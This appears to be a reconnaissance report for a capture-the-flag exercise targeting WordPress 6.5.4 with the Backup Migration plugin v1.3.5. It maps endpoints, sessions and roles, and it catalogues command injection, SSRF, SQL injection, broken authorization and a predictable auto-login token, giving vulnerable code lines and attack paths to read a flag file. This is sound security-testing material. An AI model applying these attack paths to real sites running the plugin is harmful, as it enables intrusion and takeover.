# Reconnaissance Deliverable: WordPress 6.5.4 with Backup Migration Plugin v1.3.5

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

---

## 1. Executive Summary

This WordPress 6.5.4 application with Backup Migration plugin v1.3.5 presents a **CRITICAL RISK** security posture with multiple high-severity vulnerabilities providing direct paths to complete system compromise. The application is deployed as a containerized two-tier architecture (Apache/PHP + MySQL 8.0) accessible on port 45513 with Spanish localization (es-CL).

**Core Purpose:** WordPress content management system configured as a CTF challenge environment with intentionally vulnerable backup management functionality.

**Technology Stack:**
- **Frontend:** WordPress 6.5.4 (PHP 8.3.27 / Apache 2.4.65)
- **Backend:** MySQL 8.0
- **Infrastructure:** Docker Compose, no CDN, no HTTPS enforcement
- **Critical Plugin:** Backup Migration v1.3.5 (contains multiple RCE vulnerabilities)

**Attack Surface Overview:**
- 60+ AJAX endpoints through Backup Migration plugin
- Standard WordPress authentication endpoints (wp-login.php, xmlrpc.php)
- REST API endpoints (minimal, no custom plugin endpoints)
- Multiple file upload/download handlers
- Staging environment management interfaces

**Critical Security Findings:**
1. **3 Command Injection Vulnerabilities** - RCE via backup name, URL, and filename parameters
2. **3 SQL Injection Vulnerabilities** - Database compromise via table name injection
3. **6 Authorization Bypass Vulnerabilities** - Including time-based auto-login and config-based bypasses
4. **Weak Database Credentials** - wordpress/wordpress and root/root_password
5. **Missing HTTPS & Security Headers** - No encryption in transit, no defense-in-depth controls
6. **Missing SameSite Cookie Attribute** - CSRF vulnerabilities despite nonce protection

**CTF Flag Location:** `/opt/flag.txt` within WordPress container (also exposed as FLAG environment variable)

**Most Direct Attack Path:**
```
Authenticate as any user → Exploit SSRF (file:// protocol) → Read /opt/flag.txt
OR
Authenticate as any user → Command injection via backup operations → cat /opt/flag.txt
```

---

## 2. Technology & Service Map

### Frontend
- **Framework:** WordPress 6.5.4
- **Language:** PHP 8.3.27
- **Web Server:** Apache 2.4.65 (Debian)
- **Localization:** Spanish (es-CL)
- **Authentication Libraries:** WordPress Core (PHPass, wp-session-tokens)
- **JavaScript:** WordPress core libraries, Backup plugin (Tooltipster)
- **Themes:** Twenty Twenty-Four (active), Twenty Twenty-Three, Twenty Twenty-Two

### Backend
- **Language:** PHP 8.3.27
- **Framework:** WordPress Core 6.5.4
- **Database:** MySQL 8.0
- **Key Dependencies:**
  - Backup Migration plugin v1.3.5 (backup-backup)
  - Akismet Anti-Spam v5.3.2
  - WordPress core libraries (158 PHP files in includes/)

### Infrastructure
- **Hosting Provider:** Docker Compose (local deployment)
- **CDN:** None
- **Database Type:** MySQL 8.0 (containerized)
- **Network:** Docker bridge network (no external exposure)
- **Container Runtime:** Docker (wordpress:latest + mysql:8.0 base images)

### Identified Subdomains
**Note:** Subfinder results show multiple localhost subdomains but these appear to be DNS artifacts:
- exchvm.nwcnet.localhost
- mail.localhost
- mail03.regency.localhost
- owa.regency.localhost
- sbs.allsaintsschool.localhost
- www.localhost
- naeu2.naeuinc.localhost
- server02.counterintel.localhost
- fndlync01.5ninesdata.localhost
- autodiscover.regency.localhost
- mail02.regency.localhost
- mail.regency.localhost
- mse-ca-mail.corp.mse.localhost
- server2.hunter.localhost
- autodiscover.localhost
- tools.sonoma.edu.localhost

**Analysis:** These are NOT actual application subdomains but DNS enumeration artifacts. The application is accessible solely via `localhost:45513`.

### Open Ports & Services
Based on nmap scan of localhost:
- **Port 80/tcp:** Caddy HTTP server (reverse proxy to WordPress)
- **Port 443/tcp:** SSL/HTTPS (Caddy, currently misconfigured)
- **Port 631/tcp:** CUPS 2.3 (print service, out of scope)
- **Port 8888/tcp:** TCP wrapped service (out of scope)
- **Port 49152/tcp:** Golang net/http server (Tailscale, out of scope)
- **Port 45513/tcp:** WordPress application (PRIMARY TARGET)

**Primary Attack Surface:** Port 45513 mapping to WordPress container on internal port 80

---

## 3. Authentication & Session Management Flow

### Entry Points
- **Primary Login:** `/wp-login.php` (web form)
- **XML-RPC:** `/xmlrpc.php` (legacy API authentication)
- **REST API:** `/wp-json/` endpoints (cookie or application password auth)
- **Application Password Authorization:** `/wp-admin/authorize-application.php` (OAuth-like flow)

### 3.1 Primary Authentication Mechanism

**Step-by-Step Login Process:**

1. **Credential Submission** (`/wp-login.php`)
   - User submits `log` (username) and `pwd` (password) via POST
   - Test cookie set to verify browser cookie support
   - File: `/wordpress/wp-login.php:1273-1323`

2. **Credential Validation** (`wp_signon`)
   - Calls `wp_authenticate()` to verify credentials
   - Multiple authentication handlers checked in order:
     - `wp_authenticate_username_password` (primary)
     - `wp_authenticate_email_password` (email login)
     - `wp_authenticate_cookie` (existing session)
     - `wp_authenticate_application_password` (API authentication)
   - File: `/wordpress/wp-includes/user.php:40-123`

3. **Password Verification**
   - Password hashes retrieved from `wp_users.user_pass`
   - PHPass framework validates using bcrypt or MD5-iterated hashing
   - Constant-time comparison via `hash_equals()`
   - File: `/wordpress/wp-includes/class-phpass.php`

4. **Session Token Generation**
   - Token generated: 43-character alphanumeric string via `wp_generate_password(43, false, false)`
   - Uses PHP's `random_int()` CSPRNG for strong randomness
   - Token metadata stored: IP address, User-Agent, expiration, login timestamp
   - File: `/wordpress/wp-includes/class-wp-session-tokens.php:123-155`

5. **Token Hashing & Storage**
   - Token hashed with SHA-256 before database storage
   - Stored in `wp_usermeta` table under meta_key `session_tokens`
   - Multiple concurrent sessions supported per user
   - File: `/wordpress/wp-includes/class-wp-user-meta-session-tokens.php:77-102`

6. **Cookie Setting**
   - **Authentication Cookie:** `wordpress_[hash]` with HMAC-signed format:
     - Format: `username|expiration|token|hmac`
     - HMAC includes password fragment (invalidates on password change)
   - **Logged-In Cookie:** `wordpress_logged_in_[hash]` for frontend tracking
   - **Cookie Flags:**
     - HttpOnly: ✅ Always TRUE
     - Secure: ⚠️ Based on `is_ssl()` (FALSE for HTTP deployments)
     - SameSite: ❌ NOT SET (CSRF vulnerability)
   - File: `/wordpress/wp-includes/pluggable.php:1093-1098`

7. **Session Expiration**
   - Standard: 2 days (172,800 seconds)
   - "Remember Me": 14 days (1,209,600 seconds)
   - Grace Period: +1 hour for POST/AJAX requests
   - File: `/wordpress/wp-includes/pluggable.php:972-993`

8. **Redirect to Dashboard**
   - Successful login redirects to `/wp-admin/` or specified redirect_to parameter
   - Fires `wp_login` action hook for plugins
   - Session fully established

### Code Pointers

**Primary Authentication Files:**
- `/wordpress/wp-login.php` - Login form handler and action routing
- `/wordpress/wp-includes/pluggable.php` - Core authentication functions (wp_authenticate, wp_signon, wp_set_auth_cookie)
- `/wordpress/wp-includes/user.php` - Authentication handlers and password verification
- `/wordpress/wp-includes/class-wp-session-tokens.php` - Session token lifecycle management
- `/wordpress/wp-includes/class-phpass.php` - Password hashing (PHPass framework)

**Session Validation on Requests:**
- `/wordpress/wp-includes/pluggable.php:693-820` - Cookie validation (wp_validate_auth_cookie)
- Validates: expiration, HMAC signature, session token existence
- Uses constant-time comparison to prevent timing attacks

**Logout Process:**
- `/wordpress/wp-includes/pluggable.php:656-672` - wp_logout()
- Destroys current session token from database
- Clears all authentication cookies
- Resets current user to anonymous (user ID 0)

### 3.1 Role Assignment Process

**Role Determination:**
- Roles assigned during user registration or by administrator
- Stored in `wp_usermeta` table under meta_key `wp_capabilities`
- Format: Serialized PHP array: `a:1:{s:10:"subscriber";b:1;}`
- Retrieved on each request via `WP_User::init()` and `set_role_for_user()`
- File: `/wordpress/wp-includes/class-wp-user.php`

**Default Role:**
- Configured in `wp_options` table: `default_role` option
- Standard default: `subscriber` (lowest privilege level)
- Registration currently disabled: `users_can_register = '0'`

**Role Upgrade Path:**
- **Manual:** Administrator edits user via `/wp-admin/user-edit.php`
- **Programmatic:** Via `WP_User::set_role($role)` or `WP_User::add_cap($cap)`
- **No Self-Service:** Users cannot upgrade own privileges
- **No Automatic:** No automated role escalation mechanisms found

**Code Implementation:**
- Role storage: `wp_usermeta` table, serialized PHP array
- Role assignment: `/wordpress/wp-admin/includes/user.php` (edit_user function)
- Role retrieval: `/wordpress/wp-includes/class-wp-user.php:init()`

### 3.2 Privilege Storage & Validation

**Storage Location:**
- **Primary:** `wp_usermeta` table, meta_key `wp_capabilities`
- **Secondary:** `wp_usermeta` table, meta_key `wp_user_level` (legacy numeric level)
- **Format:** Serialized PHP array mapping capabilities to boolean values
- **Example:** `a:1:{s:13:"administrator";b:1;}` or `a:2:{s:10:"subscriber";b:1;s:10:"edit_posts";b:1;}`

**Validation Points:**
1. **Primary Capability Check:** `current_user_can($capability)`
   - Location: `/wordpress/wp-includes/capabilities.php:293-368`
   - Process: Checks current user's capabilities array
   - Supports: Primitive capabilities (edit_posts) and meta capabilities (edit_post)

2. **Meta Capability Mapping:** `map_meta_cap($capability, $user_id, $args)`
   - Location: `/wordpress/wp-includes/capabilities.php:44-822`
   - Process: Converts context-aware capabilities to primitive capabilities
   - Example: `edit_post` → checks post ownership → requires `edit_published_posts` or `edit_others_posts`

3. **Role Check (Discouraged):** `is_admin()`
   - Location: `/wordpress/wp-includes/load.php:935-947`
   - **WARNING:** Only checks if current page is in `/wp-admin/` directory, NOT user privileges
   - **Vulnerability:** Backup plugin incorrectly uses this for authorization

4. **Super Admin Check:** `is_super_admin($user_id)`
   - Location: `/wordpress/wp-includes/capabilities.php:861-889`
   - Only applicable in multisite installations
   - Bypasses most capability checks (dangerous if compromised)

**Cache/Session Persistence:**
- Capabilities loaded from database on each page load
- Cached in `WP_User` object for request duration
- **No caching between requests** - always fresh from database
- Changes take effect immediately on next request

**Code Pointers:**
- Capability loading: `/wordpress/wp-includes/class-wp-user.php:305-390` (init method)
- Capability checking: `/wordpress/wp-includes/capabilities.php:293-368` (has_cap method)
- Meta capability mapping: `/wordpress/wp-includes/capabilities.php:44-822` (map_meta_cap function)

### 3.3 Role Switching & Impersonation

**Impersonation Features:** ❌ NOT IMPLEMENTED in WordPress core

**Role Switching:** ❌ NO native role switching functionality

**Temporary Privilege Elevation:** ❌ NO "sudo mode" equivalent

**Audit Trail:** ⚠️ WordPress logs authentication events via action hooks but does NOT log capability checks or role changes by default

**Potential Plugin-Based Impersonation:**
- Some plugins (e.g., "User Switching") add impersonation capabilities
- **NOT INSTALLED** in this application
- Backup plugin's auto-login mechanism provides similar functionality (CRITICAL VULNERABILITY)

**Code Implementation:** N/A - Features not present

**Security Note:** Backup Migration plugin implements a weak auto-login mechanism:
- Location: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:996-1046`
- Provides time-based authentication bypass
- Allows automatic administrator login after backup restoration
- Token format: `timestamp_IP_4u70L051n` (predictable)
- Time window: ±6 seconds
- **CRITICAL:** This is effectively a privilege escalation vulnerability

---

## 4. API Endpoint Inventory

**Network Surface Focus:** This table includes ONLY endpoints accessible through network requests to the deployed application on port 45513. All local-only CLI tools, build scripts, and development utilities have been excluded.

### WordPress Core Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET/POST | /wp-login.php | anon | None | None | Handles login, logout, password reset, registration. See `/wordpress/wp-login.php:1-1542` |
| POST | /xmlrpc.php | varies | varies | HTTP Basic Auth or cookies | XML-RPC API (60+ methods). See `/wordpress/xmlrpc.php:1-206` and `/wordpress/wp-includes/class-wp-xmlrpc-server.php:6849` for pingback |
| GET/POST | /wp-admin/admin-ajax.php | varies | varies | wp_ajax_* hooks | AJAX dispatcher for authenticated and unauthenticated actions. See `/wordpress/wp-admin/admin-ajax.php:1-212` |
| GET | /wp-cron.php | none | None | Transient lock | WordPress cron system (internal). See `/wordpress/wp-cron.php:1-206` |
| GET/POST/PUT/DELETE | /wp-json/* | varies | varies | Per-endpoint permission callbacks | REST API discovery and endpoints. See `/wordpress/wp-includes/rest-api.php` |
| GET/POST | /wp-admin/authorize-application.php | user | None | Cookie auth + nonce | Application password authorization. See `/wordpress/wp-admin/authorize-application.php:1-183` |
| POST | /wp-admin/async-upload.php | user | None | Cookie auth + upload capability | Media file upload handler. See `/wordpress/wp-admin/async-upload.php:1-120` |

### Backup Migration Plugin - AJAX Endpoints

**Base Handler:** `POST /wp-admin/admin-ajax.php?action=backup_migration`  
**Common Parameters:** `token=bmi`, `f=[function_name]`, `nonce=[valid_nonce]`  
**Authorization:** ALL endpoints use same check at `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297`
- Check: `(isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && is_admin()) || $cli`
- **CRITICAL FLAW:** Uses `is_admin()` instead of `current_user_can('manage_options')`
- **Impact:** Any authenticated user in /wp-admin/ area can access ALL functions

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=create-backup | ⚠️ user (any) | None | is_admin() + nonce | Creates full site backup. **CRITICAL:** Command injection at `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php:638,640` |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup | ⚠️ user (any) | file (backup filename) | is_admin() + nonce | Restores from backup ZIP. **CRITICAL:** Command injection at line 1145, IDOR - no ownership check |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup | ⚠️ user (any) | url (remote URL) | is_admin() + nonce | Downloads backup from URL. **CRITICAL:** Command injection + SSRF at lines 1513, 1463 |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=upload-backup | ⚠️ user (any) | None | is_admin() + nonce | Chunked file upload handler. See `/wordpress/wp-content/plugins/backup-backup/includes/uploader/chunks.php:1-208` |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=delete-backup | ⚠️ user (any) | filenames (array) | is_admin() + nonce | Deletes backup files. IDOR - no ownership check. Path traversal at line 1672 |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=get-current-backups | ⚠️ user (any) | None | is_admin() + nonce | Lists all backup files. Information disclosure |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=save-storage | ⚠️ user (any) | directory (path) | is_admin() + nonce | Configures storage location. **HIGH:** Arbitrary directory creation at line 1732 |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=save-file-config | ⚠️ user (any) | None | is_admin() + nonce | Configures backup file inclusion/exclusion |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options | ⚠️ user (any) | None | is_admin() + nonce | Configures plugin options including PHP CLI path (leads to command injection) |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=scan-directory | ⚠️ user (any) | None | is_admin() + nonce | Scans directory for backup candidates |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=reset-latest | ⚠️ user (any) | None | is_admin() + nonce | Resets latest backup status |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=is-running-backup | ⚠️ user (any) | None | is_admin() + nonce | Checks if backup operation in progress |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=stop-backup | ⚠️ user (any) | None | is_admin() + nonce | Stops running backup operation |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=force-backup-to-stop | ⚠️ user (any) | None | is_admin() + nonce | Force stops backup operation |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=force-restore-to-stop | ⚠️ user (any) | None | is_admin() + nonce | Force stops restore operation |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=unlock-backup | ⚠️ user (any) | None | is_admin() + nonce | Unlocks backup operations |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=lock-backup | ⚠️ user (any) | None | is_admin() + nonce | Locks backup operations |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=migration-locked | ⚠️ user (any) | None | is_admin() + nonce | Checks migration lock status |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=get-dynamic-names | ⚠️ user (any) | None | is_admin() + nonce | Retrieves dynamic naming configuration |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=reset-configuration | ⚠️ user (any) | None | is_admin() + nonce | Resets plugin configuration to defaults |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=get-site-data | ⚠️ user (any) | None | is_admin() + nonce | Retrieves site information. Information disclosure |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=send-test-mail | ⚠️ user (any) | None | is_admin() + nonce | Sends test email notification |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=calculate-cron | ⚠️ user (any) | None | is_admin() + nonce | Calculates cron schedule |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=dismiss-error-notice | ⚠️ user (any) | None | is_admin() + nonce | Dismisses error notification |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=fix_uname_issues | ⚠️ user (any) | None | is_admin() + nonce | Fixes uname detection issues |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=revert_uname_issues | ⚠️ user (any) | None | is_admin() + nonce | Reverts uname fixes |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=continue_restore_process | special | None | BMI_RESTORE_SECRET constant | Continues restore after database import. See line 1033 |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=htaccess-litespeed | ⚠️ user (any) | None | is_admin() + nonce | Configures LiteSpeed .htaccess |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-local-name | ⚠️ user (any) | None | is_admin() + nonce | Sets staging site name |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-start-local-creation | ⚠️ user (any) | None | is_admin() + nonce | Initiates staging site creation |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-local-creation-process | ⚠️ user (any) | None | is_admin() + nonce | Processes staging site creation |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-tastewp-creation-process | ⚠️ user (any) | None | is_admin() + nonce | Creates TasteWP staging site |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-rename-display | ⚠️ user (any) | None | is_admin() + nonce | Renames staging site display name |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-prepare-login | ⚠️ user (any) | None | is_admin() + nonce | Prepares auto-login token for staging |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-delete-permanently | ⚠️ user (any) | None | is_admin() + nonce | Permanently deletes staging site |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=staging-get-updated-list | ⚠️ user (any) | None | is_admin() + nonce | Retrieves updated staging site list |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=send-troubleshooting-logs | ⚠️ user (any) | None | is_admin() + nonce | Sends troubleshooting logs to support |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=log-sharing-details | ⚠️ user (any) | None | is_admin() + nonce | Retrieves log sharing configuration |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=get-latest-backup | ⚠️ user (any) | None | is_admin() + nonce | Retrieves latest backup information |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=front-end-ajax-error | ⚠️ user (any) | None | is_admin() + nonce | Logs frontend AJAX error |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=debugging | ⚠️ user (any) | None | is_admin() + nonce | Retrieves debugging information |
| POST | /wp-admin/admin-ajax.php?action=backup_migration&f=check-not-uploaded-backups | ⚠️ user (any) | None | is_admin() + nonce | Checks for incomplete uploads |

### Backup Migration Plugin - GET Parameter Routes

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | /?backup-migration=BMI_BACKUP&backup-id=[filename] | ⚠️ conditional | backup-id (filename) | STORAGE::DIRECT::URL config OR admin | **CRITICAL:** Downloads backup file. Public if config enabled! See `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1048-1114` |
| GET | /?backup-migration=BMI_BACKUP_LOGS&backup-id=[filename] | admin | backup-id (filename) | current_user_can('administrator') | Extracts and downloads logs from backup ZIP. See lines 1115-1157 |
| GET | /?backup-migration=PROGRESS_LOGS&backup-id=[timestamp]&progress-id=[logfile] | ⚠️ time-based | progress-id (log filename) | **Time-based:** Public if file < 5 min old | **MEDIUM:** Progress logs accessible without auth during operations. See lines 1159-1285 |
| GET | /?backup-migration=AFTER_RESTORE&backup-id=[timestamp]&progress-id=[token] | ❌ none | None | **CRITICAL:** Time + IP + predictable token | **CRITICAL AUTH BYPASS:** Automatic admin login after restore. Token: `timestamp_IP_4u70L051n`. See lines 996-1046 |

### Akismet Plugin REST API (Low Priority)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET/POST | /wp-json/akismet/v1/key | admin | None | current_user_can('manage_options') | API key management. See `/wordpress/wp-content/plugins/akismet/class.akismet-rest-api.php:13` |
| GET/POST | /wp-json/akismet/v1/settings | admin | None | current_user_can('manage_options') | Plugin settings. See line 37 |
| GET | /wp-json/akismet/v1/stats | admin | None | current_user_can('manage_options') | Spam statistics. See line 62 |

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** This section includes ONLY input vectors from network-accessible endpoints. All local-only scripts, CLI tools, build utilities, and development components have been excluded.

### URL Parameters (GET)

**WordPress Core:**
- `/wp-login.php?action=[login|logout|lostpassword|register|rp|resetpass|postpass|confirm_admin_email|confirmaction]` - Login action routing
- `/wp-login.php?redirect_to=[url]` - Post-login redirect (open redirect potential)
- `/wp-login.php?interim-login=[1]` - Popup login mode
- `/wp-login.php?reauth=[1]` - Force re-authentication
- `/wp-login.php?key=[reset_key]&login=[username]` - Password reset tokens
- `/wp-admin/admin-ajax.php?action=[action_name]` - AJAX action dispatcher
- `/wp-cron.php?doing_wp_cron=[timestamp]` - Cron trigger
- `/?backup-migration=[BMI_BACKUP|BMI_BACKUP_LOGS|PROGRESS_LOGS|AFTER_RESTORE]` - Backup plugin routing
- `/?backup-migration=BMI_BACKUP&backup-id=[filename]` - **CRITICAL:** Backup file download (potential path traversal)
- `/?backup-migration=PROGRESS_LOGS&backup-id=[timestamp]&progress-id=[logfile]` - **MEDIUM:** Log file access (time-based auth bypass)
- `/?backup-migration=AFTER_RESTORE&backup-id=[timestamp]&progress-id=[token]` - **CRITICAL:** Auto-login token (predictable authentication bypass)

**Exact Code Locations:**
- Backup download: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1052` - `$backupname = sanitize_text_field($_GET['backup-id']);`
- Progress logs: Line 1165-1280 - Multiple `$_GET['progress-id']` references
- Auto-login: Line 999-1001 - `$_GET['backup-id']` and `$_GET['progress-id']` for token validation

### POST Body Fields (JSON/Form)

**WordPress Core Authentication:**
- `/wp-login.php`:
  - `log` - Username or email (line 1277: `$user = wp_signon($credentials, $secure_cookie)`)
  - `pwd` - Password
  - `rememberme` - Remember me checkbox (extends session to 14 days)
  - `redirect_to` - Post-login redirect URL
  - `testcookie` - Cookie functionality test
  - `interim-login` - Popup mode flag
  - `reauth` - Re-authentication flag

**Backup Migration Plugin - AJAX Parameters:**
- **Common Parameters (ALL ajax.php functions):**
  - `action=backup_migration` - Required for routing
  - `token=bmi` - Hardcoded plugin token check (line 297)
  - `f=[function_name]` - Function dispatcher
  - `nonce=[wp_nonce]` - CSRF protection (line 55)

- **create-backup** (`f=create-backup`):
  - Backup name derived from configuration (potential command injection vector)
  - Location: `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php:602-880`

- **restore-backup** (`f=restore-backup`):
  - `file` - Backup filename - **CRITICAL:** Command injection at line 1145
    - Code: `@exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_restore ' . $backupName . ' ' . $remoteType . ' > /dev/null &', $res);`
  - `remote` - Remote restore flag
  - Location: Lines 1075-1357

- **download-backup** (`f=download-backup` - Quick Migration):
  - `url` - Remote backup URL - **CRITICAL:** Command injection + SSRF at lines 1513, 1463
    - Entry: Line 1498 - `$url = $this->post['url'];`
    - SSRF Sink: Line 1437 - `$ch = curl_init(str_replace(' ', '%20', $url));`
    - Command Injection: Line 1513 - `@exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_quick_migration "' . $url . '" > /dev/null &', $res);`
  - Location: Lines 1481-1635

- **upload-backup** (`f=upload-backup`):
  - `file_name` - Filename (path traversal potential)
  - `file_total` - Total file size
  - `file_index` - Current chunk index
  - `file_size` - Current chunk size
  - `taskStart` - Upload task timestamp
  - Location: `/wordpress/wp-content/plugins/backup-backup/includes/uploader/chunks.php:13-208`

- **delete-backup** (`f=delete-backup`):
  - `filenames` - Array of backup filenames - **MEDIUM:** Path traversal at line 1672
    - Code: `$file = preg_replace('/\.\./', '', $file);` (weak protection)
    - Sink: Line 1680 - `unlink(BMI_BACKUPS . '/' . $file);`
  - `deleteCloud` - Cloud deletion flag
  - `cloudDetails` - Cloud storage details
  - Location: Lines 1640-1719

- **save-storage** (`f=save-storage`):
  - `directory` - Storage path - **HIGH:** Arbitrary directory creation
    - Entry: Line 1722 - `$dir_path = $this->post['directory'];`
    - Sink: Line 1732 - `@mkdir($dir_path, 0755, true);`
  - `access` - Access URL
  - `gdrivedirname` - Google Drive directory
  - Location: Lines 1721-1844

- **save-file-config** (`f=save-file-config`):
  - `database_group` - Database backup flag
  - `files_group` - Files backup flag
  - `files-group-*` - Individual file group flags (plugins, uploads, themes, etc.)
  - `ex_b_*` - Exclusion filter patterns
  - `dynamic-*` - Dynamic exclusion paths
  - `db-excluded-tables` - Database table exclusions
  - Location: Lines 2053-2202

- **save-other-options** (`f=save-other-options`):
  - `email` - Notification email
  - `email_title` - Email subject
  - `php_cli_manual_path` - **HIGH:** User-controlled PHP CLI path (used in exec() calls)
    - Entry: Line 1867
    - Later used in all exec() calls without validation
  - `db_queries_amount` - Database query batch size
  - Various boolean flags
  - Location: Lines 1846-2011

### HTTP Headers

**WordPress Core:**
- `HTTP_X_REQUESTED_WITH` - AJAX request detection (must be 'xmlhttprequest')
  - Check: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:294`
- `HTTP_X_WP_NONCE` - REST API nonce header
  - Location: `/wordpress/wp-includes/rest-api.php:1081-1085`
- `HTTP_AUTHORIZATION` or `REDIRECT_HTTP_AUTHORIZATION` - HTTP Basic Auth for application passwords
  - Parsing: `/wordpress/wp-includes/load.php:106-139`
- `HTTP_HOST` - Host header (used in URL construction)
  - **MEDIUM:** Host header injection potential at `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php:168`
- `HTTP_USER_AGENT` - User agent (stored in session metadata)
- `HTTP_REFERER` - Referrer header (may be logged)

### Cookie Values

**WordPress Authentication Cookies:**
- `wordpress_[hash]` - Authentication cookie
  - Format: `username|expiration|token|hmac`
  - Validation: `/wordpress/wp-includes/pluggable.php:693-820`
- `wordpress_logged_in_[hash]` - Logged-in cookie for frontend
- `wordpress_test_cookie` - Cookie support test
  - Check: `/wordpress/wp-login.php:520,523`
- `wp-settings-{user_id}` - User preferences
- `wp-settings-time-{user_id}` - Preferences timestamp

**Plugin Cookies:**
- No custom cookies set by Backup Migration plugin

### File Uploads

**WordPress Core Media Upload:**
- Endpoint: `/wp-admin/async-upload.php`
- Field: `async-upload` (file field)
- Validation: File type check via `wp_check_filetype_and_ext()`
- Allowed types: Configured in `upload_mimes` filter (images, videos, documents by default)
- Storage: `/wp-content/uploads/{year}/{month}/`
- Location: `/wordpress/wp-admin/async-upload.php:1-120`

**Backup Plugin Upload:**
- Endpoint: `/wp-admin/admin-ajax.php?action=backup_migration&f=upload-backup`
- Field: `file_data` (file chunks)
- Validation: Extension check only - **MEDIUM:** Only `.zip` allowed (line 62)
  - Code: `if (pathinfo($name, PATHINFO_EXTENSION) !== 'zip') { return $this->responseTemplate(false, __('Only ZIP files are accepted!', 'backup-backup')); }`
  - **Weakness:** Extension-based only, no magic byte validation
- Storage: `/wp-content/backup-migration-eh8dobKJWN/backups/`
- Location: `/wordpress/wp-content/plugins/backup-backup/includes/uploader/chunks.php:62`

### Database Query Parameters (Restoration Context)

**Search & Replace During Restore:**
- Source: Backup manifest and database dump files
- Parameters: Table names, search strings, replace strings
- **CRITICAL:** SQL injection via table names
  - Entry: Table names extracted from SQL dump via `explode('`', $line)[1]`
  - Location: `/wordpress/wp-content/plugins/backup-backup/includes/database/even-better-restore-v4.php:247,250`
  - Sink: Multiple SQL queries in `/wordpress/wp-content/plugins/backup-backup/includes/database/search-replace.php:96,128,151,183`
    - Line 96: `$fields = $wpdb->get_results('DESCRIBE ' . $table);` - Direct concatenation, no escaping
    - Line 183: `$sql = 'UPDATE ' . $table . ' SET ' . implode(', ', $update_sql) . ' WHERE ' . implode(' AND ', array_filter($where_sql));` - Full SQL injection

**Domain/Path Replacement:**
- Source: Backup manifest (`manifest.dbdomain`, `manifest.config.ABSPATH`)
- Used in: Search & replace WHERE clauses
- Validation: `mysqli_real_escape_string()` applied but LIKE wildcards not escaped
